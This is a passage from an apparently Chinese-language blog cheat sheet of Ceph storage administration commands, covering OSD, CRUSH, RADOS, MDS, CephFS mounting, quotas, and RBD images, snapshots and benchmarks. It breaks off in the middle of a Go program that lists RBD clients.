title="1.4、OSD"></a>1.4、OSD</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 设置 ceph 集群标志位(monitor节点上执行) </span><br>ceph osd <span class="hljs-built_in">set</span> noout<br>ceph osd <span class="hljs-built_in">set</span> norecover<br>ceph osd <span class="hljs-built_in">set</span> norebalance<br>ceph osd <span class="hljs-built_in">set</span> nobackfill<br>ceph osd <span class="hljs-built_in">set</span> nodown<br>ceph osd <span class="hljs-built_in">set</span> pause<br><br><span class="hljs-comment"># 取消之前设置的集群标志位</span><br>ceph osd <span class="hljs-built_in">unset</span> noout<br>ceph osd <span class="hljs-built_in">unset</span> norecover<br>ceph osd <span class="hljs-built_in">unset</span> norebalance<br>ceph osd <span class="hljs-built_in">unset</span> nobackfill<br>ceph osd <span class="hljs-built_in">unset</span> nodown<br>ceph osd <span class="hljs-built_in">unset</span> pause<br><br><span class="hljs-comment"># 检查 osd 中是否启用 rdma</span><br>ceph daemon osd.0 perf dump AsyncMessenger::RDMAWorker-1<br><br><span class="hljs-comment"># 检查 osd 中的 ms_type 类型</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">ls</span> /var/lib/ceph/osd/ | <span class="hljs-built_in">cut</span> -d - -f 2) ; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;osd.<span class="hljs-variable">$i</span> : &quot;</span><br>    ceph --admin-daemon /var/run/ceph/ceph-osd.<span class="hljs-variable">$i</span>.asok config show | grep ms_type;<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="1-4-1、CRUSH"><a href="#1-4-1、CRUSH" class="headerlink" title="1.4.1、CRUSH"></a>1.4.1、CRUSH</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 crush class 类型</span><br>ceph osd crush class <span class="hljs-built_in">ls</span><br><br><span class="hljs-comment"># 查看 crush rule 规则</span><br>ceph osd crush rule <span class="hljs-built_in">ls</span><br><br><span class="hljs-comment"># 查看 crush 列表</span><br>ceph osd crush tree<br><br><span class="hljs-comment"># 查看 crush map</span><br><span class="hljs-built_in">rm</span> -rf crushmap.file crushmap-human.file<br>ceph osd getcrushmap -o crushmap.file<br>crushtool -d crushmap.file -o crushmap-human.file<br><span class="hljs-built_in">cat</span> crushmap-human.file<br><br><span class="hljs-comment"># 修改 crush map</span><br>vi crushmap-human.file<br>crushtool -c crushmap-human.file -o crushmap-modified.file<br>ceph osd setcrushmap -i crushmap-modified.file<br><br><span class="hljs-comment"># 新增 root 类型的名为 hpsfs 的 crush</span><br>ceph osd crush add-bucket hpsfs root<br><br><span class="hljs-comment"># 新增 root 类型的名为 lcsfs 的 crush</span><br>ceph osd crush add-bucket lcsfs root<br></code></pre></td></tr></table></figure><h3 id="1-4-2、RADOS"><a href="#1-4-2、RADOS" class="headerlink" title="1.4.2、RADOS"></a>1.4.2、RADOS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 遍历 pool 中的对象列表 (有序输出)</span><br>rados -p cephfs_metadata <span class="hljs-built_in">ls</span> | <span class="hljs-built_in">sort</span><br><br><span class="hljs-comment"># 获取 object 数据</span><br><span class="hljs-built_in">rm</span> -rf 1.00000000.inode.outfile<br>rados -p cephfs_metadata get 1.00000000.inode 1.00000000.inode.outfile<br>hexdump -C 1.00000000.inode.outfile<br><br><span class="hljs-comment"># 获取 xattr 数据</span><br><span class="hljs-built_in">rm</span> -rf 609.00000000.xattr.layout<br>rados -p cephfs_metadata listxattr 609.00000000<br>rados -p cephfs_metadata getxattr 609.00000000 layout &gt; 609.00000000.xattr.layout<br>rados -p cephfs_metadata getxattr 609.00000000 parent &gt; 609.00000000.xattr.parent<br>hexdump -C 609.00000000.xattr.layout<br>hexdump -C 609.00000000.xattr.parent<br><br><span class="hljs-comment"># 获取 omap 数据</span><br>rados -p cephfs_metadata listomapkeys 1.00000000<br>rados -p cephfs_metadata listomapvals 1.00000000<br><br><br><span class="hljs-comment"># 查看对象对应的 pg 信息</span><br>rados -p cephfs_metadata<br>ceph osd map cephfs_metadata 100.00000000<br></code></pre></td></tr></table></figure><h2 id="1-5、MDS"><a href="#1-5、MDS" class="headerlink" title="1.5、MDS"></a>1.5、MDS</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看缓存配置</span><br>ceph tell mds.* config get mds_cache_memory_limit<br><br><span class="hljs-comment"># 调整缓存配置优化读写性能</span><br>ceph tell mds.* config <span class="hljs-built_in">set</span> mds_cache_trim_interval 10<br>ceph tell mds.* config <span class="hljs-built_in">set</span> mds_cache_trim_threshold 256K<br>ceph tell mds.* config <span class="hljs-built_in">set</span> mds_cache_memory_limit 16G<br></code></pre></td></tr></table></figure><h2 id="1-6、日志"><a href="#1-6、日志" class="headerlink" title="1.6、日志"></a>1.6、日志</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 要启用文件日志记录</span><br>ceph config <span class="hljs-built_in">set</span> global log_to_file <span class="hljs-literal">true</span><br>ceph config <span class="hljs-built_in">set</span> global mon_cluster_log_to_file <span class="hljs-literal">true</span><br><br><span class="hljs-comment"># 如果您选择将日志记录到文件，我们建议您禁用 journald 日志记录，否则所有内容都会被记录两次</span><br><span class="hljs-comment"># 运行以下命令可禁用 stderr 日志记录</span><br>ceph config <span class="hljs-built_in">set</span> global log_to_stderr <span class="hljs-literal">false</span><br>ceph config <span class="hljs-built_in">set</span> global mon_cluster_log_to_stderr <span class="hljs-literal">false</span><br>ceph config <span class="hljs-built_in">set</span> global log_to_journald <span class="hljs-literal">false</span><br>ceph config <span class="hljs-built_in">set</span> global mon_cluster_log_to_journald <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h1 id="二、CephFS"><a href="#二、CephFS" class="headerlink" title="二、CephFS"></a>二、CephFS</h1><h2 id="2-1、创建文件系统"><a href="#2-1、创建文件系统" class="headerlink" title="2.1、创建文件系统"></a>2.1、创建文件系统</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加 mds 组件并创建文件系统（使用 cephadm 部署的集群）</span><br>ceph fs volume create cephfs<br><br><span class="hljs-comment"># 创建文件系统（手动操作）</span><br><span class="hljs-comment"># 创建一个名为 cephfs 的文件系统</span><br>ceph osd pool create cephfs_data 64<br>ceph osd pool create cephfs_metadata 64<br>ceph osd pool <span class="hljs-built_in">set</span> cephfs_data pg_autoscale_mode off<br>ceph osd pool <span class="hljs-built_in">set</span> cephfs_metadata pg_autoscale_mode off<br>ceph fs new cephfs cephfs_metadata cephfs_data<br>ceph fs status cephfs<br></code></pre></td></tr></table></figure><h2 id="2-2、挂载文件系统"><a href="#2-2、挂载文件系统" class="headerlink" title="2.2、挂载文件系统"></a>2.2、挂载文件系统</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kernel 方式挂载 cephfs</span><br><span class="hljs-comment"># 详细支持的参数列表: https://github.com/ceph/ceph/blob/v19.2.1/src/mount/mount.ceph.c#L473</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/cephfs-kernel<br><span class="hljs-comment"># mesage v1 挂载</span><br>mount -t ceph 10.10.10.1:6789,10.10.10.2:6789,10.10.10.3:6789:/ /mnt/cephfs-kernel -o name=admin,secret=AQBVokZoak+LJRAAqgeJr6j77v729bfvBl/Z3g==<br><span class="hljs-comment"># message v2 挂载</span><br>mount -t ceph 10.10.10.1:3300,10.10.10.2:3300,10.10.10.3:3300:/ /mnt/cephfs-kernel -o name=admin,secret=AQBVokZoak+LJRAAqgeJr6j77v729bfvBl/Z3g==,ms_mode=crc,mount_timeout=5<br><br><span class="hljs-comment"># kernel 方式开机自动挂载</span><br>vi /etc/fstab<br>10.10.10.1:6789,10.10.10.2:6789,10.10.10.3:6789:/ /mnt/cephfs-kernel ceph name=admin,secret=AQBVokZoak+LJRAAqgeJr6j77v729bfvBl/Z3g== 0 2<br><br><br><span class="hljs-comment"># fuse 方式挂载 cephfs</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/cephfs-fuse<br><span class="hljs-comment"># mesage v1 挂载</span><br>ceph-fuse -c /etc/ceph/ceph.conf -n client.admin -m 10.10.10.1:6789,10.10.10.2:6789,10.10.10.3:6789 /mnt/cephfs-fuse --client_mountpoint /<br><span class="hljs-comment"># mesage v2 挂载</span><br>ceph-fuse -c /etc/ceph/ceph.conf -n client.admin -m 10.10.10.1:3300,10.10.10.2:3300,10.10.10.3:3300 /mnt/cephfs-fuse --client_mountpoint /<br><br><span class="hljs-comment"># fuse 方式开机自动挂载</span><br>vi /etc/fstab<br>none /mnt/cephfs-fuse fuse.ceph ceph.name=client.User,ceph.conf=/etc/ceph/ceph.conf,ceph.client_mountpoint=/,_netdev,defaults 0 0<br><br><br><span class="hljs-comment"># kernel 方式取消挂载</span><br>umount /mnt/cephfs-kernel<br><br><span class="hljs-comment"># fuse 取消挂载</span><br>fusermount -u /mnt/cephfs-fuse<br><span class="hljs-comment"># 如果删除不掉可以使用 -z 参数，lazy 模式</span><br><span class="hljs-comment"># fusermount -u -z /mnt/cephfs-fuse</span><br></code></pre></td></tr></table></figure><h2 id="2-3、文件布局"><a href="#2-3、文件布局" class="headerlink" title="2.3、文件布局"></a>2.3、文件布局</h2><p>官方文档: <a href="https://docs.ceph.com/en/latest/cephfs/file-layouts/">https://docs.ceph.com/en/latest/cephfs/file-layouts/</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 读取文件布局</span><br><span class="hljs-comment"># pool: 字符串，可指定 ID 或名字。它是文件的数据对象所在的 RADOS 存储池。</span><br><span class="hljs-comment"># stripe_unit: 字节数、整数。一个文件的数据块按照此尺寸（字节）像 RAID 0 一样分布。</span><br><span class="hljs-comment">#              一文件所有条带单元的尺寸一样，最后一个条带单元通常不完整——即它包含</span><br><span class="hljs-comment">#              文件末尾的数据、还有数据末端到固定条带单元尺寸之间的未使用“空间”。</span><br><span class="hljs-comment"># stripe_count: 整数。组成 RAID 0 “条带”数据的连续条带单元数量。</span><br><span class="hljs-comment"># object_size: 整数个字节。文件数据按此尺寸分块为 RADOS 对象。</span><br>getfattr -n ceph.file.layout file1<br>getfattr -n ceph.file.layout.pool file1<br>getfattr -n ceph.file.layout.stripe_unit file1<br>getfattr -n ceph.file.layout.stripe_count file1<br>getfattr -n ceph.file.layout.object_size file1<br><br><span class="hljs-comment"># 设置文件布局</span><br><span class="hljs-comment"># 用 setfattr 命令修改文件的布局字段时，此文件必须是空的，否则会报错。</span><br>setfattr -n ceph.file.layout.pool -v 1 file2<br>setfattr -n ceph.file.layout.pool -v cephfs_data file2<br>setfattr -n ceph.file.layout.stripe_unit -v 1048576 file2<br>setfattr -n ceph.file.layout.stripe_count -v 8 file2<br>setfattr -n ceph.file.layout.object_size -v 10485760 file2<br><br><span class="hljs-comment"># 获取目录布局</span><br>getfattr -n ceph.dir.layout <span class="hljs-built_in">dir</span><br><br><span class="hljs-comment"># 设置目录布局</span><br><span class="hljs-comment"># 用于将不同的目录的数据存储到不同的数据池中</span><br>setfattr -n ceph.dir.layout.pool -v cephfs_data_hps /mnt/cephfs-kernel/hps<br>setfattr -n ceph.dir.layout.pool -v cephfs_data_lcs /mnt/cephfs-kernel/lcs<br><br><span class="hljs-comment"># 清除目录布局</span><br>setfattr -x ceph.dir.layout <span class="hljs-built_in">dir</span><br></code></pre></td></tr></table></figure><h2 id="2-4、用户认证"><a href="#2-4、用户认证" class="headerlink" title="2.4、用户认证"></a>2.4、用户认证</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看用户列表</span><br>ceph auth <span class="hljs-built_in">ls</span><br><br><span class="hljs-comment"># 查看特定用户</span><br>ceph auth get client.admin<br><br><span class="hljs-comment"># 新增用户</span><br><span class="hljs-comment"># 用户名为 bugwz , 拥有 / 的读权限, 拥有 /user/bugwz 的读写权限</span><br><span class="hljs-comment"># ceph auth get-or-create client.bugwz mon &#x27;allow r fsname=cephfs&#x27; mds &#x27;allow r fsname=cephfs, allow rw fsname=cephfs path=/user/bugwz&#x27; osd &#x27;allow rw tag cephfs data=cephfs&#x27;</span><br>ceph fs authorize cephfs client.bugwz / r /user/bugwz rw<br><br><span class="hljs-comment"># 修改用户权限</span><br><span class="hljs-comment"># 需指定完整的权限列表</span><br>ceph auth caps client.bugwz mon <span class="hljs-string">&#x27;allow r fsname=cephfs&#x27;</span> mds <span class="hljs-string">&#x27;allow r fsname=cephfs, allow rw fsname=cephfs path=/user/bugwz, allow rw fsname=cephfs path=/user/other&#x27;</span> osd <span class="hljs-string">&#x27;allow rw tag cephfs data=cephfs&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="2-5、配额"><a href="#2-5、配额" class="headerlink" title="2.5、配额"></a>2.5、配额</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看目录配额</span><br>getfattr -n ceph.quota.max_bytes /mnt/cephfs-kernel/dir<br>getfattr -n ceph.quota.max_files /mnt/cephfs-kernel/dir<br><br><span class="hljs-comment"># 限制目录配额</span><br>setfattr -n ceph.quota.max_bytes -v 1073741824 /mnt/cephfs-kernel/dir<br>setfattr -n ceph.quota.max_files -v 10 /mnt/cephfs-kernel/dir<br><br><span class="hljs-comment"># 取消目录配额</span><br>setfattr -n ceph.quota.max_bytes -v 0 /mnt/cephfs-kernel/dir<br>setfattr -n ceph.quota.max_files -v 0 /mnt/cephfs-kernel/dir<br></code></pre></td></tr></table></figure><h2 id="2-6、读写测试"><a href="#2-6、读写测试" class="headerlink" title="2.6、读写测试"></a>2.6、读写测试</h2><p>详细的读写测试教程参见: <a href="https://bugwz.com/2023/06/01/ceph-test/">https://bugwz.com/2023/06/01/ceph-test/</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 限速写</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=/mnt/cephfs-kernel/testfile1 oflag=direct status=progress<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=/mnt/cephfs-fuse/testfile2 oflag=direct status=progress<br><br><span class="hljs-comment"># 限速读</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/cephfs-kernel/testfile1 bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/cephfs-fuse/testfile2 bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br></code></pre></td></tr></table></figure><h2 id="2-7、MDS多活"><a href="#2-7、MDS多活" class="headerlink" title="2.7、MDS多活"></a>2.7、MDS多活</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 设置多活 mds 数量</span><br>ceph fs <span class="hljs-built_in">set</span> cephfs max_mds 2<br><br><span class="hljs-comment"># 绑定目录数到指定 mds</span><br><span class="hljs-comment"># -1 表示为绑定</span><br>setfattr -n ceph.dir.pin -v 0 /mnt/cephfs-kernel/dir1<br>setfattr -n ceph.dir.pin -v 1 /mnt/cephfs-kernel/dir2<br>setfattr -n ceph.dir.pin -v -1 /mnt/cephfs-kernel/dir3<br><br><span class="hljs-comment"># 获取绑定目录的信息</span><br>getfattr -n ceph.dir.pin /mnt/cephfs-kernel/dir1<br>getfattr -n ceph.dir.pin /mnt/cephfs-kernel/dir2<br>getfattr -n ceph.dir.pin /mnt/cephfs-kernel/dir3<br></code></pre></td></tr></table></figure><h2 id="2-8、NFS"><a href="#2-8、NFS" class="headerlink" title="2.8、NFS"></a>2.8、NFS</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 挂载导出的 nfs</span><br><span class="hljs-comment"># mount -t nfs4 -o nfsvers=4.1,proto=tcp 10.10.0.1:/cephfs/ /mnt/cephfs-nfs/</span><br>mount -t nfs4 -o nfsvers=4.1,proto=tcp,rw 10.10.0.1:/cephfs/ /mnt/cephfs-nfs/<br><br><span class="hljs-comment"># 取消 nfs 挂载</span><br>umount /mnt/cephfs-nfs<br></code></pre></td></tr></table></figure><h2 id="2-9、客户端"><a href="#2-9、客户端" class="headerlink" title="2.9、客户端"></a>2.9、客户端</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看挂载的客户端列表</span><br>ceph daemon mds.host01 session <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><h1 id="三、CephRBD"><a href="#三、CephRBD" class="headerlink" title="三、CephRBD"></a>三、CephRBD</h1><h2 id="3-1、数据池"><a href="#3-1、数据池" class="headerlink" title="3.1、数据池"></a>3.1、数据池</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 遍历 pool</span><br>ceph osd lspools<br><br><span class="hljs-comment"># 创建 rbd pool</span><br>ceph osd pool create rbdpool 64 64<br>ceph osd pool application <span class="hljs-built_in">enable</span> rbdpool rbd<br>ceph osd pool <span class="hljs-built_in">set</span> rbdpool pg_autoscale_mode off<br>rbd pool init rbdpool<br><br><span class="hljs-comment"># 查看 pool 的最大容量</span><br>ceph osd pool get-quota rbdpool<br><br><span class="hljs-comment"># 设置 pool 的最大容量和最大对象数量</span><br>ceph osd pool set-quota rbdpool max_bytes 100GB<br>ceph osd pool set-quota rbdpool max_objects 10000<br></code></pre></td></tr></table></figure><h2 id="3-2、映像"><a href="#3-2、映像" class="headerlink" title="3.2、映像"></a>3.2、映像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 rbd pool 中 image 列表</span><br>rbd -p rbdpool <span class="hljs-built_in">ls</span><br><br><span class="hljs-comment"># 创建 rbd image</span><br><span class="hljs-comment"># rbd create -p rbdpool --image rbdimg01 --size 10G</span><br>rbd create rbdpool/rbdimg01 --size 10G<br><br><span class="hljs-comment"># 查看 image 信息</span><br>rbd info rbdpool/rbdimg01<br><br><span class="hljs-comment"># 挂载 image</span><br><span class="hljs-comment"># rbd map</span><br>rbd device map rbdpool/rbdimg01<br>mkfs.xfs /dev/rbd0<br><span class="hljs-built_in">mkdir</span> -p /mnt/cephrbd<br>mount /dev/rbd0 /mnt/cephrbd<br><br><span class="hljs-comment"># 取消挂载 image</span><br><span class="hljs-comment"># rbd unmap</span><br>umount /mnt/cephrbd<br>rbd device unmap rbdpool/rbdimg01<br><br><span class="hljs-comment"># 查看挂载的 image</span><br><span class="hljs-comment"># rbd device list</span><br>rbd device <span class="hljs-built_in">ls</span><br><br><span class="hljs-comment"># 在线调整 rbd 的格式化的文件系统的大小</span><br><span class="hljs-comment"># 仅限于 xfs 格式化类型的 image</span><br>xfs_growfs -d /mnt/cephrbd-01<br><br><br><span class="hljs-comment"># 删除 image</span><br><span class="hljs-comment"># rbd rm --pool rbdpool --image rbdimg01</span><br>rbd <span class="hljs-built_in">rm</span> rbdpool/rbdimg01<br><br><span class="hljs-comment"># 移动 image 到回收站</span><br>rbd trash move rbdpool/rbdimg01 --expires-at 20300101<br>rbd trash -p rbdpool <span class="hljs-built_in">ls</span><br><br><span class="hljs-comment"># 从回收站中移出 image</span><br>rbd trash -p rbdpool <span class="hljs-built_in">ls</span><br>rbd trash restore -p rbdpool 3e199935e4ead<br><br><span class="hljs-comment"># 统计 image 使用量</span><br>rbd diff rbdpool/rbdimg01 | awk <span class="hljs-string">&#x27;&#123; SUM += $2 &#125; END &#123; print SUM/1024/1024/1024 &quot; GB&quot; &#125;&#x27;</span><br><br><span class="hljs-comment"># 查看 image 使用容量</span><br>rbd <span class="hljs-built_in">du</span> rbdpool/rbdimg01<br></code></pre></td></tr></table></figure><h2 id="3-3、快照"><a href="#3-3、快照" class="headerlink" title="3.3、快照"></a>3.3、快照</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 snapshot</span><br><span class="hljs-comment"># rbd snap create --pool rbdpool --image rbdimg01 --snap 20240701</span><br>rbd snap create rbdpool/rbdimg01@20240701<br><br><span class="hljs-comment"># 查看 image 所有快照</span><br>rbd snap <span class="hljs-built_in">ls</span> rbdpool/rbdimg01<br><br><span class="hljs-comment"># 回滚 snapshot</span><br><span class="hljs-comment"># 回滚 snapshot 之后需要重新挂载，否则数据可能会有问题</span><br>rbd snap rollback rbdpool/rbdimg01@20240701<br>umount /mnt/cephrbd<br>mount /dev/rbd0 /mnt/cephrbd<br><br><span class="hljs-comment"># 保护 snapshot</span><br><span class="hljs-comment"># 无法删除受保护的 snapshot</span><br>rbd snap protect rbdpool/rbdimg01@20240701<br><br><span class="hljs-comment"># 取消保护 snapshot</span><br>rbd snap unprotect rbdpool/rbdimg01@20240701<br><br><span class="hljs-comment"># 删除 snapshot</span><br>rbd snap remove rbdpool/rbdimg01@20240701<br>rbd snap <span class="hljs-built_in">ls</span> rbdpool/rbdimg01<br><br><span class="hljs-comment"># 克隆 snapshot</span><br>rbd snap protect rbdpool/rbdimg01@20240701<br>rbd <span class="hljs-built_in">clone</span> rbdpool/rbdimg01@20240701 rbdpool/rbdimg01.<span class="hljs-built_in">clone</span><br>rbd snap unprotect rbdpool/rbdimg01@20240701<br>rbd -p rbdpool <span class="hljs-built_in">ls</span><br><br><span class="hljs-comment"># 查看克隆 snapshot 数量</span><br>rbd children rbdpool/rbdimg01@20240701<br><br><span class="hljs-comment"># 独立克隆的 snapshot</span><br>rbd flatten rbdpool/rbdimg01.<span class="hljs-built_in">clone</span><br>rbd info rbdpool/rbdimg01.<span class="hljs-built_in">clone</span><br><br><span class="hljs-comment"># 导出 snapshot</span><br>rbd <span class="hljs-built_in">export</span> rbdpool/rbdimg01@20240701 /root/rbdpool-rbdimg01@20240701<br><br><span class="hljs-comment"># 导入 snapshot</span><br>rbd import /root/rbdpool-rbdimg01@20240701 rbdpool/rbdimg03<br></code></pre></td></tr></table></figure><h2 id="3-4、读写压测"><a href="#3-4、读写压测" class="headerlink" title="3.4、读写压测"></a>3.4、读写压测</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 随机读</span><br>rbd bench --pool rbdpool --image rbdimg01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern rand --io-type <span class="hljs-built_in">read</span><br><br><span class="hljs-comment"># 随机写</span><br>rbd bench --pool rbdpool --image rbdimg01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern rand --io-type write<br><br><span class="hljs-comment"># 顺序读</span><br>rbd bench --pool rbdpool --image rbdimg01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern <span class="hljs-built_in">seq</span> --io-type <span class="hljs-built_in">read</span><br><br><span class="hljs-comment"># 顺序写</span><br>rbd bench --pool rbdpool --image rbdimg01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern <span class="hljs-built_in">seq</span> --io-type write<br><br><span class="hljs-comment"># 随机比例读写: 读:80%，写:20%</span><br>rbd bench --pool rbdpool --image rbdimg01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern rand --io-type readwrite --rw-mix-read 80<br><br><span class="hljs-comment"># 随机比例读写: 读:20%，写:80%</span><br>rbd bench --pool rbdpool --image rbdimg01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern rand --io-type readwrite --rw-mix-read 20<br><br><span class="hljs-comment"># 顺序比例读写: 读:80%，写:20%</span><br>rbd bench --pool rbdpool --image rbdimg01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern <span class="hljs-built_in">seq</span> --io-type readwrite --rw-mix-read 80<br><br><span class="hljs-comment"># 顺序比例读写: 读:20%，写:80%</span><br>rbd bench --pool rbdpool --image rbdimg01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern <span class="hljs-built_in">seq</span> --io-type readwrite --rw-mix-read 20<br></code></pre></td></tr></table></figure><h2 id="3-5、监控报警"><a href="#3-5、监控报警" class="headerlink" title="3.5、监控报警"></a>3.5、监控报警</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 prometheus 模块中统计 rbd pool 的间隔时间（默认为 300）</span><br>ceph config get mgr mgr/prometheus/rbd_stats_pools_refresh_interval<br><br><span class="hljs-comment"># 设置 prometheus 模块中统计 rbd pool 的间隔时间</span><br>ceph config <span class="hljs-built_in">set</span> mgr mgr/prometheus/rbd_stats_pools_refresh_interval<br><br><span class="hljs-comment"># 查看 rbd 监控 pool 列表</span><br>ceph config get mgr mgr/prometheus/rbd_stats_pools<br><br><span class="hljs-comment"># 设置 rbd 监控 pool 列表</span><br>ceph config <span class="hljs-built_in">set</span> mgr mgr/prometheus/rbd_stats_pools <span class="hljs-string">&quot;rbdpool01,rbdpool02,rbdpool03&quot;</span><br><br><span class="hljs-comment"># 取消 rbd 监控 pool 列表</span><br>ceph config <span class="hljs-built_in">set</span> mgr mgr/prometheus/rbd_stats_pools <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="3-6、客户端"><a href="#3-6、客户端" class="headerlink" title="3.6、客户端"></a>3.6、客户端</h2><p>获取 rbd pool image 的客户端列表。具体的执行操作流程如下:</p><ol><li><code>ceph --conf %s --user admin -f json mon stat</code> : 获取 mon 节点名称列表;</li><li><code>ceph --conf %s --user admin -f json tell mon.%s sessions</code> : 获取 mon 节点上的 session(client) 列表信息;</li><li><code>ceph --conf %s --user admin -f json osd pool ls detail</code> : 获取 rbd 类型的数据池;</li><li><code>rbd --conf %s --id admin list --format json --pool %s</code> : 遍历 rbd 类型的数据池其中的映像列表;</li><li><code>rbd --conf %s --id admin info --format json --pool %s --image %s</code> : 获取 rbd 类型的数据池映像的块名前缀信息;</li><li><code>rados --conf %s --id admin --format json --pool %s listwatchers rbd_header.%s</code> : 获取 rbd 池中监听对应块名对象的客户端;</li></ol><figure class="highlight golang"><table><tr><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/json&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;os/exec&quot;</span><br><span class="hljs-string">&quot;strconv&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;sync/atomic&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br><br><span class="hljs-string">&quot;github.com/olekukonko/tablewriter&quot;</span><br><span class="hljs-string">&quot;github.com/olekukonko/tablewriter/renderer&quot;</span><br><span class="hljs-string">&quot;github.com/olekukonko/tablewriter/tw&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> CephMonStateQuorum <span class="hljs-keyword">struct</span> &#123;<br>Rank <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;rank&quot;`</span><br>Name <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;name&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> CephMonState <span class="hljs-keyword">struct</span> &#123;<br>Epoch             <span class="hljs-type">int64</span>                <span class="hljs-string">`json:&quot;epoch&quot;`</span><br>MinMonReleaseName <span class="hljs-type">string</span>               <span class="hljs-string">`json:&quot;min_mon_release_name&quot;`</span><br>NumMons           <span class="hljs-type">int64</span>                <span class="hljs-string">`json:&quot;num_mons&quot;`</span><br>Leader            <span class="hljs-type">string</span>               <span class="hljs-string">`json:&quot;leader&quot;`</span><br>Quorum            []CephMonStateQuorum <span class="hljs-string">`json:&quot;quorum&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> CephPool <span class="hljs-keyword">struct</span> &#123;<br>ID                  <span class="hljs-type">int64</span>                  <span class="hljs-string">`json:&quot;pool_id&quot;`</span><br>Name                <span class="hljs-type">string</span>                 <span class="hljs-string">`json:&quot;pool_name&quot;`</span><br>FlagsNames          <span class="hljs-type">string</span>                 <span class="hljs-string">`json:&quot;flags_names&quot;`</span><br>Type                <span class="hljs-type">int64</span>                  <span class="hljs-string">`json:&quot;type&quot;`</span><br>Size                <span class="hljs-type">int64</span>                  <span class="hljs-string">`json:&quot;size&quot;`</span><br>MinSize             <span class="hljs-type">int64</span>                  <span class="hljs-string">`json:&quot;min_size&quot;`</span><br>PGAutoscaleMode     <span class="hljs-type">string</span>                 <span class="hljs-string">`json:&quot;pg_autoscale_mode&quot;`</span><br>PGNum               <span class="hljs-type">int64</span>                  <span class="hljs-string">`json:&quot;pg_num&quot;`</span><br>TargetMaxBytes      <span class="hljs-type">int64</span>                  <span class="hljs-string">`json:&quot;target_max_bytes&quot;`</span><br>TargetMaxObjects    <span class="hljs-type">int64</span>                  <span class="hljs-string">`json:&quot;target_max_objects&quot;`</span><br>ApplicationMetadata <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125; <span class="hljs-string">`json:&quot;application_metadata&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> CephRBDPoolImage <span class="hljs-keyword">struct</span> &#123;<br>Name            <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;name&quot;`</span><br>ID              <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;id&quot;`</span><br>Size            